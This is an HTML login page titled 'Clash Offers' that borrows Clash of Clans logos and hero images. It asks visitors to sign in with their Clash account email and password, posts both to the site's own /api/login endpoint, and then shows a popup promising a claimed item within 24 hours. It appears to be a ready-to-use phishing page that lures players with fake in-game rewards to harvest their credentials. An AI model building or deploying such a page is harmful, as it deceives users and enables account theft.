<!DOCTYPE html>
<html>
<head>
  <title>Login - Clash Offers</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body class="login-body">
<div class="login-container">
  <img src="https://static.wikia.nocookie.net/clashofclans/images/5/55/Clash_Logo.png" alt="Clash Logo" class="login-logo">
  <h2>Sign in</h2>
  <p class="login-sub">Use your Clash account</p>
  <input id="loginEmail" type="email" placeholder="Email">
  <input id="loginPassword" type="password" placeholder="Password">
  <button onclick="login()">Login</button>
</div>
<div id="popup" class="popup">
  <div class="popup-content">
    <img src="https://static.wikia.nocookie.net/clashofclans/images/6/6d/Judgement_King_Skin.png" alt="Clash Thank You">
    <h2>Thank you!</h2>
    <p>Your item will be claimed within 24 hours.</p>
    <button onclick="document.getElementById('popup').style.display='none'">Close</button>
  </div>
</div>
<img src="https://static.wikia.nocookie.net/clashofclans/images/f/f5/BarbarianKing_info.png" class="anim-char king">
<img src="https://static.wikia.nocookie.net/clashofclans/images/8/89/ArcherQueen_info.png" class="anim-char queen">
<script>
async function login(){
  const email=document.getElementById("loginEmail").value;
  const password=document.getElementById("loginPassword").value;
  const res=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email,password})});
  const data=await res.json();
  if(data.success) document.getElementById('popup').style.display='flex';
}
</script>
</body>
</html>
